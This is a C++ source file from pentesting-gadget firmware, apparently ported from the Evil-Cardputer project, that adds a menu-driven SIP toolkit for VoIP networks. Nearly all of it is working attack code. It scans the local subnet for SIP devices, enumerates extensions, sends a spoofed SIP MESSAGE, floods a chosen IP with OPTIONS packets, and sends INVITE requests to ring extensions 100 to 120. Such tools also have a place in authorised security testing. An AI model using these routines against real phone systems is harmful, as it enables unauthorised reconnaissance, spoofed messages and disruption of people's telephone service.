/*
 * Ported from Evil-Cardputer (Evil-M5Project) by 7h30th3r0n3.
 * Combined firmware: AGPL-3.0-or-later (Bruce).
 */
#include "sip.h"
#if defined(EVIL_EXTENSIONS)
#include "root/input/mykeyboard.h"
#include "root/net/wifi_common.h"
#include "root/ui/display.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <globals.h>

namespace {

void sipSend(WiFiUDP &udp, IPAddress ip, const char *method, const char *user = "100") {
    String req = String(method) + " sip:" + user + "@" + ip.toString() + " SIP/2.0\r\n" +
                 "Via: SIP/2.0/UDP " + WiFi.localIP().toString() + ":5060;branch=z9hG4bKkvx\r\n" +
                 "From: <sip:kvxputer@" + WiFi.localIP().toString() + ">;tag=kvx\r\n" +
                 "To: <sip:" + user + "@" + ip.toString() + ">\r\n" +
                 "Call-ID: " + String(millis()) + "@kvxputer\r\nCSeq: 1 " + method +
                 "\r\nContact: <sip:kvxputer@" + WiFi.localIP().toString() + ":5060>\r\n" +
                 "Max-Forwards: 70\r\nContent-Length: 0\r\n\r\n";
    udp.beginPacket(ip, 5060);
    udp.write((const uint8_t *)req.c_str(), req.length());
    udp.endPacket();
}

IPAddress askIp() {
    String s = keyboard(WiFi.gatewayIP().toString(), 16, "Target IP");
    IPAddress ip;
    ip.fromString(s);
    return ip;
}

void sipScan() {
    if (!WiFi.isConnected() && !wifiConnectMenu(WIFI_STA)) return;
    WiFiUDP udp;
    udp.begin(5060);
    IPAddress gw = WiFi.gatewayIP();
    int hits = 0;
    drawMainBorderWithTitle("SIP Scanner");
    EscPress = false;
    char buf[256];
    for (int i = 1; i < 40 && !check(EscPress); i++) {
        IPAddress ip(gw[0], gw[1], gw[2], i);
        sipSend(udp, ip, "OPTIONS");
        delay(30);
        int n = udp.parsePacket();
        if (n > 0) {
            n = udp.read((uint8_t *)buf, sizeof(buf) - 1);
            buf[n] = 0;
            if (strstr(buf, "SIP/2.0")) {
                hits++;
                Serial.printf("[sip] %s\n%s\n", ip.toString().c_str(), buf);
            }
        }
        tft.fillRect(10, 40, tftWidth - 20, 16, kvxConfig.bgColor);
        tft.drawString(ip.toString() + " hits " + String(hits), 10, uiStatusY(0));
    }
    udp.stop();
    displayInfo("SIP hits: " + String(hits), true);
}

} // namespace

void sipMenu() {
    while (true) {
        std::vector<Option> opts = {
            {"SIP Scanner", sipScan},
            {"SIP Enumeration",
             []() {
                 if (!WiFi.isConnected() && !wifiConnectMenu(WIFI_STA)) return;
                 IPAddress ip = askIp();
                 WiFiUDP udp;
                 udp.begin(5060);
                 for (int u = 100; u <= 110; u++) sipSend(udp, ip, "OPTIONS", String(u).c_str());
                 udp.stop();
                 displayInfo("OPTIONS 100-110 sent", true);
             }},
            {"SIP Message Spoof",
             []() {
                 if (!WiFi.isConnected() && !wifiConnectMenu(WIFI_STA)) return;
                 IPAddress ip = askIp();
                 WiFiUDP udp;
                 udp.begin(5060);
                 sipSend(udp, ip, "MESSAGE");
                 udp.stop();
                 displayInfo("MESSAGE sent", true);
             }},
            {"SIP Flooding",
             []() {
                 if (!WiFi.isConnected() && !wifiConnectMenu(WIFI_STA)) return;
                 IPAddress ip = askIp();
                 WiFiUDP udp;
                 udp.begin(5060);
                 drawMainBorderWithTitle("SIP Flood");
                 EscPress = false;
                 int n = 0;
                 while (!check(EscPress) && n < 200) {
                     sipSend(udp, ip, "OPTIONS");
                     n++;
                     delay(20);
                 }
                 udp.stop();
                 displayInfo("Sent " + String(n), true);
             }},
            {"SIP Ring All",
             []() {
                 if (!WiFi.isConnected() && !wifiConnectMenu(WIFI_STA)) return;
                 IPAddress ip = askIp();
                 WiFiUDP udp;
                 udp.begin(5060);
                 for (int u = 100; u <= 120; u++) sipSend(udp, ip, "INVITE", String(u).c_str());
                 udp.stop();
                 displayInfo("INVITE 100-120 sent", true);
             }},
            {"Back", []() {}},
        };
        int sel = loopOptions(opts, MENU_TYPE_SUBMENU, "SIP Toolkit");
        if (sel < 0 || sel == (int)opts.size() - 1) return;
    }
}
#endif
